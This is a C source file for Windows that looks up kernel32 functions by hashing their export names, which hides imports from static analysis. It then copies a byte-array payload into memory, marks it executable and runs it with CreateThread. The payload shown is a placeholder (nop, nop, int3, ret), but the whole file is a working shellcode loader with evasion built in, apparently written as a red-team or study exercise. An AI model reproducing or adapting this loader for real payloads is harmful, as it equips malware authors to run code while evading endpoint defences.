
#include <stdio.h>
#include <string.h>

#include <windows.h>

#pragma comment(lib, "user32.lib")

DWORD getFuncHash(char* foo) {
	size_t stringLen = strnlen_s(foo, 60);
	DWORD hash = 0x22;

	for (int i = 0; i < stringLen; i++) {
		hash += (hash * 0xab43f2e2 + foo[i]) & 0xffffff;
	}

	return hash;
}

PWORD getFooAddressesByHash(char* lib, DWORD hash) {

	// Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
    HMODULE libraryBase = LoadLibraryA(lib);

    // Parse DOS header and image headers.
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

    // Then get the .edata image directory.
    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

    // Get the relative virtual addresses for information about the exported functions.
    PDWORD addrFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
    PDWORD addrNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
    PWORD addrOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

    for (int i = 0; i < imageExportDirectory->NumberOfFunctions; i++) {

        // Retrieve function name from image directory.
        DWORD functionNameRVA = addrNamesRVA[i];
        DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
        char* functionName = (char*)functionNameVA;

        // Calculate the hash of this exported function.
        DWORD functionNameHash = getFuncHash(functionName);

        // Search for the hash.
        if (functionNameHash == hash) {
            DWORD functionAddressRVA = addrFunctionsRVA[addrOrdinalsRVA[i]];
            PWORD functionAddr = (PWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
            printf("\nFound function %s (0x%x): %p\n", functionName, functionNameHash, functionAddr);
            return functionAddr;
        }
    } 

    printf("Failed to find function with hash!\n");
    return NULL;
}

// typedef int (WINAPI* msgbox)(HWND,LPCSTR,LPCSTR,UINT);

typedef HANDLE (WINAPI*pCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);

typedef BOOL (WINAPI*pVirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);

typedef LPVOID (WINAPI* pVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);


int main(int argc, char* argv[]) {

    printf("CreateThread hash: 0x%x\n", getFuncHash("CreateThread"));
    printf("VirtualProtect hash: 0x%x\n", getFuncHash("VirtualProtect"));
    printf("VirtualAlloc hash: 0x%x\n", getFuncHash("VirtualAlloc"));

    // Payload to execute
    unsigned char payload [] = {
        0x90, 0x90, 0xcc, 0xc3
    };

    pVirtualAlloc virtualAlloc = (pVirtualAlloc)getFooAddressesByHash("kernel32", 0x59a6224);
    pVirtualProtect virtualProtect = (pVirtualProtect)getFooAddressesByHash("kernel32", 0x721e916);
    pCreateThread createTHread = (pCreateThread)getFooAddressesByHash("kernel32", 0x4c162bc);

    void* payloadMem = virtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("Payload VA: %p\n", payloadMem);

    RtlMoveMemory(payloadMem, payload, sizeof(payload));

    DWORD oldProtect = NULL;
    if (!virtualProtect(payloadMem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to load payload!\n");
        return 1;
    }

    printf("Shellcode loaded, hit to proceed...\n");
    getchar();

    HANDLE thread = createTHread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloadMem, NULL, NULL, NULL);
    if (thread == NULL) {
        printf("Failed to execute payload!\n");
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);
    
    // PWORD functionAddr = getFooAddressesByHash((char*)"user32", 0x5e07617);
    // if (functionAddr == NULL) {
    //     return 1;
    // }

    // msgbox foo = (msgbox)functionAddr;
    
    // foo(NULL, "Win32 API hasher", "Executing MessageBoxA via hashed function!", MB_ICONASTERISK | MB_OK);

    // PWORD functionAddr2 = getFooAddressesByHash((char*)"kernel32", 0x721e916);

    // vprotect foo2 = (vprotect)functionAddr2;

    // PDWORD oldProtect = 0;
    // foo2(NULL, 4, PAGE_EXECUTE_READWRITE, oldProtect);


    
    return 0;
}

